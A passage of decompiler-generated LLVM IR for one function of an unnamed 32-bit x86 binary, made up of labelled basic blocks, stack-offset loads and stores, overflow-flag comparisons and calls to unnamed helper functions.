  %v4_8050b0670 = load i32, i32* %v3_8050b0669, align 4
  %v5_8050b0671 = sub i32 %v0_8050b06.pre, %v4_8050b0670
  %v11_8050b0673 = xor i32 %v4_8050b0670, %v0_8050b06.pre
  %v12_8050b0674 = xor i32 %v5_8050b0671, %v0_8050b06.pre
  %v13_8050b0675 = and i32 %v12_8050b0674, %v11_8050b0673
  %v14_8050b0676 = icmp slt i32 %v13_8050b0675, 0
  %v16_8050b0678 = icmp slt i32 %v5_8050b0671, 0
  %v2_8050b0a79 = icmp eq i1 %v16_8050b0678, %v14_8050b0676
  br i1 %v2_8050b0a79, label %dec_label_pc_8050b16, label %dec_label_pc_8050b0c.lr.ph

dec_label_pc_8050b0c.lr.ph:                       ; preds = %dec_label_pc_80509d6
  %v0_8050b0c.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050b0c

dec_label_pc_80509e2:                             ; preds = %dec_label_pc_8050b0c
  %v1_80509e2 = add i32 %v0_80509e280, 116
  store i32 %v1_80509e2, i32* %eax.global-to-local, align 4
  %v2_80509e6 = add i32 %v0_80509e280, -4
  %v3_80509e6 = inttoptr i32 %v2_80509e6 to i32*
  store i32 %v1_80509e2, i32* %v3_80509e6, align 4
  %v3_80509e7 = load i32, i32* %v3_8050b0c, align 4
  %v5_80509e7 = add i32 %v0_80509e280, -8
  %v6_80509e7 = inttoptr i32 %v5_80509e7 to i32*
  store i32 %v3_80509e7, i32* %v6_80509e7, align 4
  %v0_80509eb = load i32, i32* @esi, align 4
  %v2_80509eb = add i32 %v0_80509e280, -12
  %v3_80509eb = inttoptr i32 %v2_80509eb to i32*
  store i32 %v0_80509eb, i32* %v3_80509eb, align 4
  %v2_80509ec = add i32 %v0_80509e280, -16
  %v3_80509ec = inttoptr i32 %v2_80509ec to i32*
  store i32 %v1_80505a6, i32* %v3_80509ec, align 4
  %v0_80509ed = call i32 @function_8051b4c()
  store i32 %v0_80509ed, i32* @eax, align 4
  %v1_80509f2 = load i32, i32* @esp, align 4
  %v2_80509f2 = add i32 %v1_80509f2, 68
  %v3_80509f2 = inttoptr i32 %v2_80509f2 to i32*
  store i32 %v0_80509ed, i32* %v3_80509f2, align 4
  %v0_80509f6 = load i32, i32* @esp, align 4
  %v1_80509f6 = add i32 %v0_80509f6, 16
  %v2_80509f9 = icmp slt i32 %v0_80509ed, 0
  %v1_80509fb = icmp eq i1 %v2_80509f9, false
  br i1 %v1_80509fb, label %dec_label_pc_8050a15, label %dec_label_pc_80509fd

dec_label_pc_80509fd:                             ; preds = %dec_label_pc_80509e2
  %v0_80509fd = load i32, i32* @ebx, align 4
  %v1_80509fd = icmp eq i32 %v0_80509fd, 0
  br i1 %v1_80509fd, label %dec_label_pc_8050ba8, label %dec_label_pc_8050a05

dec_label_pc_8050a05:                             ; preds = %dec_label_pc_80509fd
  %v1_8050a05 = add i32 %v0_80509f6, 100
  %v2_8050a05 = inttoptr i32 %v1_8050a05 to i32*
  %v3_8050a05 = load i32, i32* %v2_8050a05, align 4
  %v4_8050a05 = icmp eq i32 %v3_8050a05, 0
  br i1 %v4_8050a05, label %dec_label_pc_8050ba8, label %dec_label_pc_8050b16

dec_label_pc_8050a15:                             ; preds = %dec_label_pc_80509e2
  %v1_8050a15 = add i32 %v0_80509f6, 43
  %v2_8050a15 = inttoptr i32 %v1_8050a15 to i8*
  %v3_8050a15 = load i8, i8* %v2_8050a15, align 1
  %v4_8050a15 = icmp eq i8 %v3_8050a15, 0
  br i1 %v4_8050a15, label %dec_label_pc_8050ab6, label %dec_label_pc_8050a20

dec_label_pc_8050a20:                             ; preds = %dec_label_pc_8050a15
  %v0_8050a20 = load i32, i32* @edi, align 4
  %v1_8050a20 = add i32 %v0_8050a20, 28
  %v2_8050a20 = inttoptr i32 %v1_8050a20 to i32*
  %v3_8050a20 = load i32, i32* %v2_8050a20, align 4
  store i32 %v3_8050a20, i32* %eax.global-to-local, align 4
  %v2_8050a23 = add i32 %v0_80509f6, 160
  %v3_8050a23 = inttoptr i32 %v2_8050a23 to i32*
  store i32 %v3_8050a20, i32* %v3_8050a23, align 4
  %v0_8050a2a = load i32, i32* @edi, align 4
  %v1_8050a2a = add i32 %v0_8050a2a, 32
  %v2_8050a2a = inttoptr i32 %v1_8050a2a to i32*
  %v3_8050a2a = load i32, i32* %v2_8050a2a, align 4
  store i32 %v3_8050a2a, i32* %eax.global-to-local, align 4
  %v1_8050a2d = load i32, i32* @esp, align 4
  %v2_8050a2d = add i32 %v1_8050a2d, 148
  %v3_8050a2d = inttoptr i32 %v2_8050a2d to i32*
  store i32 %v3_8050a2a, i32* %v3_8050a2d, align 4
  %v0_8050a34 = load i32, i32* @edi, align 4
  %v1_8050a34 = add i32 %v0_8050a34, 36
  %v2_8050a34 = inttoptr i32 %v1_8050a34 to i32*
  %v3_8050a34 = load i32, i32* %v2_8050a34, align 4
  store i32 %v3_8050a34, i32* %eax.global-to-local, align 4
  %v1_8050a37 = load i32, i32* @esp, align 4
  %v2_8050a37 = add i32 %v1_8050a37, 152
  %v3_8050a37 = inttoptr i32 %v2_8050a37 to i32*
  store i32 %v3_8050a34, i32* %v3_8050a37, align 4
  %v0_8050a3e = load i32, i32* @ecx, align 4
  %v1_8050a3e = load i32, i32* @esp, align 4
  %v2_8050a3e = add i32 %v1_8050a3e, -4
  %v3_8050a3e = inttoptr i32 %v2_8050a3e to i32*
  store i32 %v0_8050a3e, i32* %v3_8050a3e, align 4
  %v1_8050a3f = add i32 %v1_8050a3e, -8
  %v2_8050a3f = inttoptr i32 %v1_8050a3f to i32*
  store i32 40, i32* %v2_8050a3f, align 4
  %v1_8050a41 = add i32 %v1_8050a3e, 116
  store i32 %v1_8050a41, i32* %edx.global-to-local, align 4
  %v2_8050a45 = add i32 %v1_8050a3e, -12
  %v3_8050a45 = inttoptr i32 %v2_8050a45 to i32*
  store i32 %v1_8050a41, i32* %v3_8050a45, align 4
  %v0_8050a46 = load i32, i32* @edi, align 4
  %v2_8050a46 = add i32 %v1_8050a3e, -16
  %v3_8050a46 = inttoptr i32 %v2_8050a46 to i32*
  store i32 %v0_8050a46, i32* %v3_8050a46, align 4
  %v4_8050a47 = call i32 @function_804d1a8(i16* inttoptr (i32 -1 to i16*), i32 %v15_8050634, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8050a47, i32* %eax.global-to-local, align 4
  %v0_8050a4c = load i32, i32* @edi, align 4
  %v1_8050a4c = add i32 %v0_8050a4c, 4
  %v2_8050a4c = inttoptr i32 %v1_8050a4c to i32*
  %v3_8050a4c = load i32, i32* %v2_8050a4c, align 4
  store i32 %v3_8050a4c, i32* %eax.global-to-local, align 4
  %v0_8050a4f = load i32, i32* @esp, align 4
  %v1_8050a4f = add i32 %v0_8050a4f, 16
  %v9_8050a52 = icmp eq i32 %v3_8050a4c, 24
  br i1 %v9_8050a52, label %dec_label_pc_8050a20.dec_label_pc_8050a79_crit_edge, label %dec_label_pc_8050a57

dec_label_pc_8050a20.dec_label_pc_8050a79_crit_edge: ; preds = %dec_label_pc_8050a20
  %.pre24 = add i32 %v0_8050a4f, 260
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %v4_8050a79.pre = load i32, i32* %.pre25, align 4
  br label %dec_label_pc_8050a79

dec_label_pc_8050a57:                             ; preds = %dec_label_pc_8050a20
  %v1_8050a57 = add i32 %v0_8050a4c, 28
  %v2_8050a57 = inttoptr i32 %v1_8050a57 to i32*
  %v3_8050a57 = load i32, i32* %v2_8050a57, align 4
  %v4_8050a57 = icmp eq i32 %v3_8050a57, 0
  br i1 %v4_8050a57, label %dec_label_pc_8050b16, label %dec_label_pc_8050a61

dec_label_pc_8050a61:                             ; preds = %dec_label_pc_8050a57
  %v1_8050a61 = add i32 %v0_8050a4f, 260
  %v2_8050a61 = inttoptr i32 %v1_8050a61 to i32*
  %v3_8050a61 = load i32, i32* %v2_8050a61, align 4
  %v12_8050a61 = icmp eq i32 %v3_8050a61, 1
  br i1 %v12_8050a61, label %dec_label_pc_8050a79, label %dec_label_pc_8050a6b

dec_label_pc_8050a6b:                             ; preds = %dec_label_pc_8050a61
  %v12_8050a6b = icmp eq i32 %v3_8050a61, 28
  %v1_8050a73 = icmp eq i1 %v12_8050a6b, false
  br i1 %v1_8050a73, label %dec_label_pc_8050b16, label %dec_label_pc_8050a79

dec_label_pc_8050a79:                             ; preds = %dec_label_pc_8050a20.dec_label_pc_8050a79_crit_edge, %dec_label_pc_8050a6b, %dec_label_pc_8050a61
  %v4_8050a79 = phi i32 [ %v4_8050a79.pre, %dec_label_pc_8050a20.dec_label_pc_8050a79_crit_edge ], [ %v3_8050a61, %dec_label_pc_8050a6b ], [ %v3_8050a61, %dec_label_pc_8050a61 ]
  %v15_8050a79 = icmp eq i32 %v3_8050a4c, %v4_8050a79
  br i1 %v15_8050a79, label %dec_label_pc_8050a8e, label %dec_label_pc_8050a82

dec_label_pc_8050a82:                             ; preds = %dec_label_pc_8050a79
  %v1_8050a85 = inttoptr i32 %v0_8050a4c to i32*
  %v2_8050a85 = load i32, i32* %v1_8050a85, align 4
  %v5_8050a85 = inttoptr i32 %v0_8050a4f to i32*
  store i32 %v2_8050a85, i32* %v5_8050a85, align 4
  %v1_8050a87 = call i32 @function_804e481(i32 -1)
  store i32 %v1_8050a87, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050afe

dec_label_pc_8050a8e:                             ; preds = %dec_label_pc_8050a79
  %v0_8050a8e = load i32, i32* @ebx, align 4
  %v1_8050a90 = sub i32 -1, %v0_8050a8e
  store i32 %v1_8050a90, i32* %eax.global-to-local, align 4
  %v2_8050a92 = add i32 %v0_8050a4f, 120
  %v3_8050a92 = inttoptr i32 %v2_8050a92 to i32*
  %v4_8050a92 = load i32, i32* %v3_8050a92, align 4
  %v5_8050a92 = add i32 %v4_8050a92, %v1_8050a90
  store i32 %v5_8050a92, i32* %eax.global-to-local, align 4
  %v2_8050a96 = add i32 %v0_8050a4c, 36
  %v3_8050a96 = inttoptr i32 %v2_8050a96 to i32*
  store i32 %v5_8050a92, i32* %v3_8050a96, align 4
  %v0_8050a99 = load i32, i32* @edi, align 4
  %v1_8050a99 = add i32 %v0_8050a99, 16
  %v2_8050a99 = inttoptr i32 %v1_8050a99 to i32*
  %v3_8050a99 = load i32, i32* %v2_8050a99, align 4
  %v1_8050a9c = add i32 %v3_8050a99, 4
  store i32 %v1_8050a9c, i32* %eax.global-to-local, align 4
  %v2_8050a9f = add i32 %v0_8050a99, 36
  %v3_8050a9f = inttoptr i32 %v2_8050a9f to i32*
  %v4_8050a9f = load i32, i32* %v3_8050a9f, align 4
  %v7_8050a9f = mul i32 %v4_8050a9f, %v1_8050a9c
  store i32 %v7_8050a9f, i32* %eax.global-to-local, align 4
  %v2_8050aa3 = add i32 %v0_8050a99, 32
  %v3_8050aa3 = inttoptr i32 %v2_8050aa3 to i32*
  %v4_8050aa3 = load i32, i32* %v3_8050aa3, align 4
  %v6_8050aa6 = icmp ugt i32 %v7_8050a9f, %v4_8050aa3
  br i1 %v6_8050aa6, label %dec_label_pc_8050a8e.dec_label_pc_8050b16.loopexit_crit_edge, label %dec_label_pc_8050aa8

dec_label_pc_8050a8e.dec_label_pc_8050b16.loopexit_crit_edge: ; preds = %dec_label_pc_8050a8e
  %v0_8050b16.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050b16

dec_label_pc_8050aa8:                             ; preds = %dec_label_pc_8050a8e
  store i32 0, i32* %v3_8050a9f, align 4
  %v0_8050aaf = load i32, i32* @esp, align 4
  %v1_8050aaf = add i32 %v0_8050aaf, 27
  %v2_8050aaf = inttoptr i32 %v1_8050aaf to i8*
  store i8 0, i8* %v2_8050aaf, align 1
  %v1_8050b01.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050b01

dec_label_pc_8050ab6:                             ; preds = %dec_label_pc_8050a15
  %v1_8050ab9 = add i32 %v0_80509f6, 132
  %v2_8050ab9 = inttoptr i32 %v1_8050ab9 to i32*
  %v3_8050ab9 = load i32, i32* %v2_8050ab9, align 4
  %v6_8050ab9 = inttoptr i32 %v0_80509f6 to i32*
  store i32 %v3_8050ab9, i32* %v6_8050ab9, align 4
  %v1_8050ac0 = call i32 @function_804e481(i32 -1)
  store i32 %v1_8050ac0, i32* %eax.global-to-local, align 4
  %v0_8050ac5 = load i32, i32* @esp, align 4
  %v1_8050ac5 = add i32 %v0_8050ac5, 16
  %v1_8050ac8 = add i32 %v0_8050ac5, 260
  %v2_8050ac8 = inttoptr i32 %v1_8050ac8 to i32*
  %v3_8050ac8 = load i32, i32* %v2_8050ac8, align 4
  store i32 %v3_8050ac8, i32* %eax.global-to-local, align 4
  %v1_8050acf = add i32 %v0_8050ac5, 136
  %v2_8050acf = inttoptr i32 %v1_8050acf to i32*
  %v3_8050acf = load i32, i32* %v2_8050acf, align 4
  %v15_8050acf = icmp eq i32 %v3_8050acf, %v3_8050ac8
  %v1_8050ad3 = icmp eq i1 %v15_8050acf, false
  br i1 %v1_8050ad3, label %dec_label_pc_8050b01, label %dec_label_pc_8050ad5

dec_label_pc_8050ad5:                             ; preds = %dec_label_pc_8050ab6
  %v0_8050ad5 = load i32, i32* @edi, align 4
  %v1_8050ad5 = add i32 %v0_8050ad5, 16
  %v2_8050ad5 = inttoptr i32 %v1_8050ad5 to i32*
  %v3_8050ad5 = load i32, i32* %v2_8050ad5, align 4
  store i32 %v3_8050ad5, i32* %eax.global-to-local, align 4
  %v2_8050ad8 = add i32 %v0_8050ac5, 148
  %v3_8050ad8 = inttoptr i32 %v2_8050ad8 to i32*
  %v4_8050ad8 = load i32, i32* %v3_8050ad8, align 4
  %v15_8050ad8 = icmp eq i32 %v3_8050ad5, %v4_8050ad8
  %v1_8050adf = icmp eq i1 %v15_8050ad8, false
  br i1 %v1_8050adf, label %dec_label_pc_8050b9b, label %dec_label_pc_8050ae5

dec_label_pc_8050ae5:                             ; preds = %dec_label_pc_8050ad5
  %v0_8050ae5 = load i32, i32* @edx, align 4
  %v2_8050ae5 = add i32 %v0_8050ac5, 12
  %v3_8050ae5 = inttoptr i32 %v2_8050ae5 to i32*
  store i32 %v0_8050ae5, i32* %v3_8050ae5, align 4
  %v0_8050ae6 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050ae6 = add i32 %v0_8050ac5, 8
  %v3_8050ae6 = inttoptr i32 %v2_8050ae6 to i32*
  store i32 %v0_8050ae6, i32* %v3_8050ae6, align 4
  %v1_8050ae7 = add i32 %v0_8050ac5, 152
  %v2_8050ae7 = inttoptr i32 %v1_8050ae7 to i32*
  %v3_8050ae7 = load i32, i32* %v2_8050ae7, align 4
  %v5_8050ae7 = add i32 %v0_8050ac5, 4
  %v6_8050ae7 = inttoptr i32 %v5_8050ae7 to i32*
  store i32 %v3_8050ae7, i32* %v6_8050ae7, align 4
  %v0_8050aee = load i32, i32* %eax.global-to-local, align 4
  %v1_8050aee = load i32, i32* @edi, align 4
  %v2_8050aee = add i32 %v1_8050aee, 36
  %v3_8050aee = inttoptr i32 %v2_8050aee to i32*
  %v4_8050aee = load i32, i32* %v3_8050aee, align 4
  %v7_8050aee = mul i32 %v4_8050aee, %v0_8050aee
  store i32 %v7_8050aee, i32* %eax.global-to-local, align 4
  %v2_8050af2 = add i32 %v1_8050aee, 28
  %v3_8050af2 = inttoptr i32 %v2_8050af2 to i32*
  %v4_8050af2 = load i32, i32* %v3_8050af2, align 4
  %v5_8050af2 = add i32 %v4_8050af2, %v7_8050aee
  store i32 %v5_8050af2, i32* %eax.global-to-local, align 4
  %v3_8050af5 = inttoptr i32 %v0_8050ac5 to i32*
  store i32 %v5_8050af2, i32* %v3_8050af5, align 4
  %v4_8050af6 = call i32 @function_804d1a8(i16* inttoptr (i32 -1 to i16*), i32 %v15_8050634, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8050af6, i32* %eax.global-to-local, align 4
  %v0_8050afb = load i32, i32* @edi, align 4
  %v1_8050afb = add i32 %v0_8050afb, 36
  %v2_8050afb = inttoptr i32 %v1_8050afb to i32*
  %v3_8050afb = load i32, i32* %v2_8050afb, align 4
  %v4_8050afb = add i32 %v3_8050afb, 1
  store i32 %v4_8050afb, i32* %v2_8050afb, align 4
  br label %dec_label_pc_8050afe

dec_label_pc_8050afe:                             ; preds = %dec_label_pc_8050a82, %dec_label_pc_8050ae5
  %v0_8050afe = load i32, i32* @esp, align 4
  %v1_8050afe = add i32 %v0_8050afe, 16
  br label %dec_label_pc_8050b01

dec_label_pc_8050b01:                             ; preds = %dec_label_pc_8050ab6, %dec_label_pc_8050aa8, %dec_label_pc_8050afe
  %v1_8050b01 = phi i32 [ %v1_8050ac5, %dec_label_pc_8050ab6 ], [ %v1_8050b01.pre, %dec_label_pc_8050aa8 ], [ %v1_8050afe, %dec_label_pc_8050afe ]
  %v0_8050b01 = load i32, i32* @esi, align 4
  %v2_8050b01 = add i32 %v1_8050b01, 52
  %v3_8050b01 = inttoptr i32 %v2_8050b01 to i32*
  %v4_8050b01 = load i32, i32* %v3_8050b01, align 4
  %v5_8050b01 = add i32 %v4_8050b01, %v0_8050b01
  store i32 %v5_8050b01, i32* @esi, align 4
  %v0_8050b05 = load i32, i32* @ebx, align 4
  %v1_8050b05 = add i32 %v0_8050b05, 1
  store i32 %v1_8050b05, i32* @ebx, align 4
  %v2_8050b06 = add i32 %v1_8050b01, 104
  %v3_8050b06 = inttoptr i32 %v2_8050b06 to i32*
  %v4_8050b06 = load i32, i32* %v3_8050b06, align 4
  %v5_8050b06 = sub i32 %v1_8050b05, %v4_8050b06
  %v11_8050b06 = xor i32 %v4_8050b06, %v1_8050b05
  %v12_8050b06 = xor i32 %v5_8050b06, %v1_8050b05
  %v13_8050b06 = and i32 %v12_8050b06, %v11_8050b06
  %v14_8050b06 = icmp slt i32 %v13_8050b06, 0
  %v16_8050b06 = icmp slt i32 %v5_8050b06, 0
  %v2_8050b0a = icmp eq i1 %v16_8050b06, %v14_8050b06
  br i1 %v2_8050b0a, label %dec_label_pc_8050b16, label %dec_label_pc_8050b0c

dec_label_pc_8050b0c:                             ; preds = %dec_label_pc_8050b0c.lr.ph, %dec_label_pc_8050b01
  %v0_8050b0c = phi i32 [ %v0_8050b0c.pre, %dec_label_pc_8050b0c.lr.ph ], [ %v5_8050b01, %dec_label_pc_8050b01 ]
  %v0_80509e280 = phi i32 [ %v1_8050b06.pre, %dec_label_pc_8050b0c.lr.ph ], [ %v1_8050b01, %dec_label_pc_8050b01 ]
  %v2_8050b0c = add i32 %v0_80509e280, 16
  %v3_8050b0c = inttoptr i32 %v2_8050b0c to i32*
  %v4_8050b0c = load i32, i32* %v3_8050b0c, align 4
  %v5_8050b0c = sub i32 %v0_8050b0c, %v4_8050b0c
  %v11_8050b0c = xor i32 %v4_8050b0c, %v0_8050b0c
  %v12_8050b0c = xor i32 %v5_8050b0c, %v0_8050b0c
  %v13_8050b0c = and i32 %v12_8050b0c, %v11_8050b0c
  %v14_8050b0c = icmp slt i32 %v13_8050b0c, 0
  %v16_8050b0c = icmp slt i32 %v5_8050b0c, 0
  %v2_8050b10 = icmp eq i1 %v16_8050b0c, %v14_8050b0c
  br i1 %v2_8050b10, label %dec_label_pc_8050b16, label %dec_label_pc_80509e2

dec_label_pc_8050b16:                             ; preds = %dec_label_pc_8050a05, %dec_label_pc_80509d6, %dec_label_pc_8050b01, %dec_label_pc_8050a57, %dec_label_pc_8050a6b, %dec_label_pc_8050b0c, %dec_label_pc_8050a8e.dec_label_pc_8050b16.loopexit_crit_edge
  %v0_8050b16 = phi i32 [ %v0_8050b16.pre.pre, %dec_label_pc_8050a8e.dec_label_pc_8050b16.loopexit_crit_edge ], [ %v1_8050b06.pre, %dec_label_pc_80509d6 ], [ %v1_8050b01, %dec_label_pc_8050b01 ], [ %v1_8050a4f, %dec_label_pc_8050a57 ], [ %v1_8050a4f, %dec_label_pc_8050a6b ], [ %v0_80509e280, %dec_label_pc_8050b0c ], [ %v1_80509f6, %dec_label_pc_8050a05 ]
  %v1_8050b19 = add i32 %v0_8050b16, 20
  %v2_8050b19 = inttoptr i32 %v1_8050b19 to i32*
  %v3_8050b19 = load i32, i32* %v2_8050b19, align 4
  %v5_8050b19 = add i32 %v0_8050b16, -16
  %v6_8050b19 = inttoptr i32 %v5_8050b19 to i32*
  store i32 %v3_8050b19, i32* %v6_8050b19, align 4
  %v1_8050b1d = call i32 @function_804b5f4(i32 -1)
  store i32 %v1_8050b1d, i32* %eax.global-to-local, align 4
  %v0_8050b22 = load i32, i32* @esp, align 4
  %v1_8050b25 = add i32 %v0_8050b22, 272
  %v2_8050b25 = inttoptr i32 %v1_8050b25 to i32*
  %v3_8050b25 = load i32, i32* %v2_8050b25, align 4
  %v4_8050b25 = icmp eq i32 %v3_8050b25, 0
  br i1 %v4_8050b25, label %dec_label_pc_8050b3a, label %dec_label_pc_8050b2f

dec_label_pc_8050b2f:                             ; preds = %dec_label_pc_8050b16
  store i32 %v3_8050b25, i32* %edx.global-to-local, align 4
  %v2_8050b36 = inttoptr i32 %v3_8050b25 to i32*
  store i32 %v1_80505a6, i32* %v2_8050b36, align 4
  %v0_8050b46.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050b46

dec_label_pc_8050b3a:                             ; preds = %dec_label_pc_8050b16
  %v3_8050b3d = inttoptr i32 %v0_8050b22 to i32*
  store i32 %v1_80505a6, i32* %v3_8050b3d, align 4
  %v1_8050b3e = call i32 @function_804e481(i32 -1)
  store i32 %v1_8050b3e, i32* %eax.global-to-local, align 4
  %v0_8050b43 = load i32, i32* @esp, align 4
  %v1_8050b43 = add i32 %v0_8050b43, 16
  br label %dec_label_pc_8050b46

dec_label_pc_8050b46:                             ; preds = %dec_label_pc_8050b2f, %dec_label_pc_8050b3a
  %v0_8050b46 = phi i32 [ %v0_8050b46.pre, %dec_label_pc_8050b2f ], [ %v1_8050b43, %dec_label_pc_8050b3a ]
  %v1_8050b49 = add i32 %v0_8050b46, 12
  %v2_8050b49 = inttoptr i32 %v1_8050b49 to i32*
  %v3_8050b49 = load i32, i32* %v2_8050b49, align 4
  %v5_8050b49 = add i32 %v0_8050b46, -16
  %v6_8050b49 = inttoptr i32 %v5_8050b49 to i32*
  store i32 %v3_8050b49, i32* %v6_8050b49, align 4
  %v1_8050b4d = call i32 @function_804e481(i32 -1)
  store i32 %v1_8050b4d, i32* @eax, align 4
  %v0_8050b52 = load i32, i32* @esp, align 4
  %v1_8050b55 = add i32 %v0_8050b52, 8
  %v2_8050b55 = inttoptr i32 %v1_8050b55 to i32*
  store i32 ptrtoint (i32* @global_var_8058488.194 to i32), i32* %v2_8050b55, align 4
  %v1_8050b5a = add i32 %v0_8050b52, 4
  %v2_8050b5a = inttoptr i32 %v1_8050b5a to i32*
  store i32 134541331, i32* %v2_8050b5a, align 4
  %v1_8050b5f = add i32 %v0_8050b52, 200
  store i32 %v1_8050b5f, i32* %ebx.global-to-local, align 4
  %v3_8050b66 = inttoptr i32 %v0_8050b52 to i32*
  store i32 %v1_8050b5f, i32* %v3_8050b66, align 4
  %v2_8050b67 = call i32 @function_804f016(i32 -1, i32 %v15_8050634)
  store i32 %v2_8050b67, i32* %eax.global-to-local, align 4
  %v0_8050b6c = load i32, i32* @esp, align 4
  %v1_8050b6c = inttoptr i32 %v0_8050b6c to i32*
  store i32 ptrtoint (i32* @global_var_8058488.194 to i32), i32* %v1_8050b6c, align 4
  %v1_8050b73 = call i32 @function_804f013(i32 -1)
  store i32 %v1_8050b73, i32* %eax.global-to-local, align 4
  %v0_8050b78 = load i32, i32* @esp, align 4
  %v1_8050b78 = add i32 %v0_8050b78, 56
  %v2_8050b78 = inttoptr i32 %v1_8050b78 to i32*
  %v3_8050b78 = load i32, i32* %v2_8050b78, align 4
  store i32 %v3_8050b78, i32* @eax, align 4
  %v1_8050b7c = add i32 %v0_8050b78, 60
  %v2_8050b7c = inttoptr i32 %v1_8050b7c to i32*
  %v3_8050b7c = load i32, i32* %v2_8050b7c, align 4
  store i32 %v3_8050b7c, i32* %edx.global-to-local, align 4
  %v1_8050b80 = inttoptr i32 %v0_8050b78 to i32*
  %v3_8050b80 = add i32 %v0_8050b78, 4
  %v1_8050b81 = inttoptr i32 %v3_8050b80 to i32*
  %v1_8050b82 = sext i32 %v3_8050b78 to i64
  store i64 %v1_8050b82, i64* @global_var_80584a0.195, align 32
  %v1_8050b87 = trunc i32 %v3_8050b7c to i16
  store i16 %v1_8050b87, i16* @global_var_8055dac.196, align 4
  store i32 1, i32* %v1_8050b81, align 4
  %v0_8050b90 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050b90, i32* %v1_8050b80, align 4
  %v2_8050b91 = call i32 @function_804f016(i32 -1, i32 %v15_8050634)
  store i32 %v2_8050b91, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050cd2

dec_label_pc_8050b9b:                             ; preds = %dec_label_pc_8050ad5
  %v1_8050b9e = inttoptr i32 %v0_8050ad5 to i32*
  %v2_8050b9e = load i32, i32* %v1_8050b9e, align 4
  %v5_8050b9e = inttoptr i32 %v0_8050ac5 to i32*
  store i32 %v2_8050b9e, i32* %v5_8050b9e, align 4
  %v1_8050ba0 = call i32 @function_804e481(i32 -1)
  store i32 %v1_8050ba0, i32* @eax, align 4
  %v0_8050ba5 = load i32, i32* @esp, align 4
  %v1_8050ba5 = add i32 %v0_8050ba5, 16
  br label %dec_label_pc_8050ba8

dec_label_pc_8050ba8:                             ; preds = %dec_label_pc_80508da, %dec_label_pc_8050a05, %dec_label_pc_80509fd, %dec_label_pc_8050999, %dec_label_pc_805091f, %dec_label_pc_80508fb, %dec_label_pc_8050b9b
  %v1_8050baf = phi i32 [ %v1_80508ef, %dec_label_pc_80508da ], [ %v1_80509f6, %dec_label_pc_8050a05 ], [ %v1_80509f6, %dec_label_pc_80509fd ], [ %v1_8050910, %dec_label_pc_8050999 ], [ %v1_8050910, %dec_label_pc_805091f ], [ %v1_8050910, %dec_label_pc_80508fb ], [ %v1_8050ba5, %dec_label_pc_8050b9b ]
  %v1_8050ba8 = add i32 %v1_8050baf, 51
  %v2_8050ba8 = inttoptr i32 %v1_8050ba8 to i8*
  %v3_8050ba8 = load i8, i8* %v2_8050ba8, align 1
  %v4_8050ba8 = icmp eq i8 %v3_8050ba8, 0
  %v1_8050bad = icmp eq i1 %v4_8050ba8, false
  br i1 %v1_8050bad, label %dec_label_pc_8050bf3, label %dec_label_pc_8050baf

dec_label_pc_8050baf:                             ; preds = %dec_label_pc_8050ba8
  %v0_8050baf = load i32, i32* @ecx, align 4
  %v2_8050baf = add i32 %v1_8050baf, -4
  %v3_8050baf = inttoptr i32 %v2_8050baf to i32*
  store i32 %v0_8050baf, i32* %v3_8050baf, align 4
  %v1_8050bb0 = add i32 %v1_8050baf, -8
  %v2_8050bb0 = inttoptr i32 %v1_8050bb0 to i32*
  store i32 ptrtoint (i32* @global_var_8055db0.136 to i32), i32* %v2_8050bb0, align 4
  %v1_8050bb5 = add i32 %v1_8050baf, -12
  %v2_8050bb5 = inttoptr i32 %v1_8050bb5 to i32*
  store i32 134541331, i32* %v2_8050bb5, align 4
  %v1_8050bba = add i32 %v1_8050baf, 184
  store i32 %v1_8050bba, i32* @esi, align 4
  %v2_8050bc1 = add i32 %v1_8050baf, -16
  %v3_8050bc1 = inttoptr i32 %v2_8050bc1 to i32*
  store i32 %v1_8050bba, i32* %v3_8050bc1, align 4
  %v2_8050bc2 = call i32 @function_804f016(i32 -1, i32 %v15_8050634)
  store i32 %v2_8050bc2, i32* %eax.global-to-local, align 4
  %v0_8050bc7 = load i32, i32* @esp, align 4
  %v1_8050bc7 = inttoptr i32 %v0_8050bc7 to i32*
  store i32 ptrtoint (i32* @global_var_8055db0.136 to i32), i32* %v1_8050bc7, align 4
  %v1_8050bce = call i32 @function_804f013(i32 -1)
  store i32 %v1_8050bce, i32* %eax.global-to-local, align 4
  %v0_8050bd3 = load i32, i32* @global_var_8058a98.197, align 8
  store i32 %v0_8050bd3, i32* %ebx.global-to-local, align 4
  %v0_8050bd9 = load i32, i32* @esp, align 4
  %v1_8050bd9 = inttoptr i32 %v0_8050bd9 to i32*
  %v2_8050bd9 = load i32, i32* %v1_8050bd9, align 4
  store i32 %v2_8050bd9, i32* @eax, align 4
  %v3_8050bd9 = add i32 %v0_8050bd9, 4
  %v1_8050bda = inttoptr i32 %v3_8050bd9 to i32*
  %v2_8050bda = load i32, i32* %v1_8050bda, align 4
  store i32 %v2_8050bda, i32* %edx.global-to-local, align 4
  %v1_8050bdb = add i32 %v0_8050bd3, -1
  store i32 %v1_8050bdb, i32* @ebx, align 4
  store i32 1, i32* %v1_8050bda, align 4
  %v0_8050bde = load i32, i32* @esi, align 4
  store i32 %v0_8050bde, i32* %v1_8050bd9, align 4
  %v2_8050bdf = call i32 @function_804f016(i32 -1, i32 %v15_8050634)
  store i32 %v2_8050bdf, i32* %eax.global-to-local, align 4
  %v0_8050be4 = load i32, i32* @esp, align 4
  %v1_8050be4 = add i32 %v0_8050be4, 16
  %v1_8050be7 = add i32 %v0_8050be4, 52
  %v2_8050be7 = inttoptr i32 %v1_8050be7 to i32*
  %v3_8050be7 = load i32, i32* %v2_8050be7, align 4
  %v4_8050be7 = load i32, i32* @ebx, align 4
  %v5_8050be7 = sub i32 %v3_8050be7, %v4_8050be7
  %v11_8050be7 = xor i32 %v4_8050be7, %v3_8050be7
  %v12_8050be7 = xor i32 %v5_8050be7, %v3_8050be7
  %v13_8050be7 = and i32 %v12_8050be7, %v11_8050be7
  %v14_8050be7 = icmp slt i32 %v13_8050be7, 0
  %v16_8050be7 = icmp slt i32 %v5_8050be7, 0
